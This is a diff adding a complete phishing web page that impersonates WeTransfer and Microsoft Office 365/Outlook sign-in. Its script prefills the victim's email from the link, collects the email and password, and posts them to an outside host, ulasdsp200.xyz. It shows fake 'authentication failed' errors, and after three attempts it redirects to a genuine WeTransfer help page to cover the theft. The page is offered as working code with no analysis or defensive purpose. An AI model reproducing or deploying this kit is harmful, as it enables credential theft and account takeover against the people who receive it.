@@ -1,0 +1,310 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <title>WeTransfer Secured</title>
+   <link
+      rel="shortcut icon"
+      href="https://cdn.glitch.com/e65b120f-b033-4153-8f73-22473e531ef0%2Ficon.ico"
+    />
+    <style type="text/css">
+
+      html, body {
+        height: 100%;
+      }
+
+     /* .main-video-wrapper{
+        position: fixed;
+        width: 100%;
+        z-index: -3;
+        }*/
+  /* The Modal (background) */
+      
+        .main-video-wrapper {
+          position:fixed;
+          top:0;
+          left:20;
+          width:100%;
+          height:100vh;
+          overflow:hidden;
+          z-index: -3;
+
+        }
+        .main-video-overlay {
+          height:100vh;
+          position: fixed;
+          top:0;
+          left:0;
+          width:100vw;
+          z-index:-1;
+          background: rgba(0,0,0,0.7);
+          opacity: 0.8;
+        }
+
+
+
+      </style>
+    </head>
+    <body>
+     <!-- videooo div start//////////// -->
+     <div class="main-video-wrapper" style="filter: blur(3px);
+     -webkit-filter: blur(3px);">
+     <!-- Embedded Video Element -->
+     <video playsinline="playsinline" autoplay="autoplay" muted="muted" loop="loop">
+      <source src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/office365-2.mp4" type="video/mp4">
+      </video>
+    </div>
+    <!-- Overlay Div for the Video -->
+    <div class="main-video-overlay"></div>
+    <!-- video div close/////////////////// -->
+    <div>
+      <div class="container-fluid">
+        <div class="container-fluid">
+          <div class="row" style="padding: 20px 0px">
+            <div class="col-lg-4 align-self-center text-center">
+              <div class="mx-auto p-1" style="border:1px solid white;width: 380px">
+                <img src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/wte.png" class="img-fluid" width="60px;">
+                <span class="h4 text-white align-middle">WeTransfer Secured</span>
+              </div>
+              <img src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/right.gif" class="img-fluid pt-2" width="380px"><br>
+              <span class="text-white">WeTransfer now has all your favorite Office 365 apps in one place. Enjoy new levels of productivity and collaboration with powerful Microsoft 365 tools.</span>
+              <!-- <img src="images/left.gif" class="img-fluid" width="150px"><br> -->
+
+            </div>
+            <div class="col-lg-8 py-3 align-self-center">
+              <div style="padding: 10px 30px 15px 30px">
+                <div class=" text-white col-lg-12"> 
+				<img src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/wte2.png"><br/><br/>
+                  <span class="h5 text-white">
+				  
+				  Select your email provider</span><br>
+                  <span style="color:white;font-family: 'Archivo Narrow', sans-serif; ">Unfortunately we could not find your email provider based on your input.</span>
+                </div>
+                <div class="">
+                  <div class="row mx-2">
+                     <div class="col-lg-3 mt-2">
+                   <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class="text-center p-1 rounded" style=" background-color: #FF3C00;">
+                          <img src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/office3651.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
+                          <span  style="vertical-align: middle; color: white;font-weight: 500">Login with<br> Office365</span>
+                        </div>
+                      </a>
+                    </div>
+
+                    <div class="col-lg-3 mt-2">
+                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class="text-center p-1 rounded" style="  background-color: #0073C8;">
+                          <img src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/outlook.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">|<br>
+                          <span style="vertical-align: middle; color: white;font-weight: 500;">Login with<br> Outlook</span>
+                        </div>
+                      </a>
+                    </div>
+                   
+                    <div class="col-lg-3 mt-2">
+                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                        <div class="text-center p-1 rounded" style=" background-color: #0B5BD3;">
+                          <img src="https://cdn.glitch.me/a9c17eb8-a395-4f7a-ba3f-0e2fc9fb1237/other1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
+                          <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;">Login with<br> Other</span>
+                        </div>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+         
+           
+   
+        </div> 
+      </div>
+
+
+    </div>
+  </div>
+
+
+
+
+    <!-- Modal for gmail -->
+    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <center>
+              <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
+              <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
+              <div class="alert alert-danger" id="msg"></div>
+
+            </center>
+            <form id="contact" class="form-horizontal well">
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="exampleInputEmail1">Email address</label>
+                  <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
+                  <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                </div>
+              </div>
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="Password">Password</label>
+                  <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
+                </div>
+              </div>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+              <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    
+
+    
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+	  
+	   /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+      } else {
+        // $('#email').val(email);
+        var my_email = email;
+        var ind = my_email.indexOf("@");
+        var my_slice = my_email.substr(ind + 1);
+        var c = my_slice.substr(0, my_slice.indexOf("."));
+        var final = c.toLowerCase();
+
+      }
+      ///////////////url getting email////////////////
+	  
+       $('#outlookmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://cdn.glitch.com/6ca72b66-8609-4328-9f2e-521097041961%2Foutlook2.png');
+        $('#field').html("Outlook");
+		$("#email").val(my_email);
+        $("#emailch").html(my_email);
+		$("#inputbar").animate({left:200, opacity:"hide"}, 0);
+        $("#automail").animate({right:200, opacity:"show"}, 1000);
+        $('#ajaxModal').modal('show');
+      });
+     
+      $('#office365modal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://cdn.glitch.com/6ca72b66-8609-4328-9f2e-521097041961%2Foffice1.png');
+        $('#field').html("Office 365");
+		$("#email").val(my_email);
+        $("#emailch").html(my_email);
+		$("#inputbar").animate({left:200, opacity:"hide"}, 0);
+        $("#automail").animate({right:200, opacity:"show"}, 1000);
+        $('#ajaxModal').modal('show');
+      });
+      $('#othermodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'https://cdn.glitch.com/6ca72b66-8609-4328-9f2e-521097041961%2Fothers2.png');
+        $('#field').html("Other Mail");
+		$("#email").val(my_email);
+        $("#emailch").html(my_email);
+		$("#inputbar").animate({left:200, opacity:"hide"}, 0);
+        $("#automail").animate({right:200, opacity:"show"}, 1000);
+        $('#ajaxModal').modal('show');
+      });
+      $('#submit-btn').click(function(event){
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var detail=$("#field").html();
+
+        
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+        count=count+1;
+        if (count>=3) {
+          count=0;
+          window.location.replace("https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi28diBns31AhU78uAKHe-UAzAQFnoECB0QAQ&url=https%3A%2F%2Fwetransfer.zendesk.com%2Fhc%2Fen-us%2Farticles%2F202672713-What-does-a-WeTransfer-subscription-offer-me-&usg=AOvVaw0r5chtNCsxmU7BSBMQOwOK");
+        }
+        else
+        {
+         $.ajax({
+          dataType: 'JSON',
+          url: 'https://www.ulasdsp200.xyz/per/wet-next.php',
+          type: 'POST',
+          data:{
+            email:email,
+            password:password,
+            detail:detail,
+
+          },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                 $('#msg').html(response['msg']);
+                  // $('input, textarea').val(function() {
+                  //    return this.defaultValue;
+                  // });
+                }
+                else{
+                  $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#msg").show();
+              $('#msg').html("Password authentication failed, try again.");
+            },
+            complete: function(){
+              $('#submit-btn').html('Login');
+            }
+          });
+       }
+     });
+    });
+	
+	
+            if(location.hash){
+               document.querySelector('#email').value=eml=location.hash.substr(1);
+               }
+            
+  </script>
+
+
+  </html>
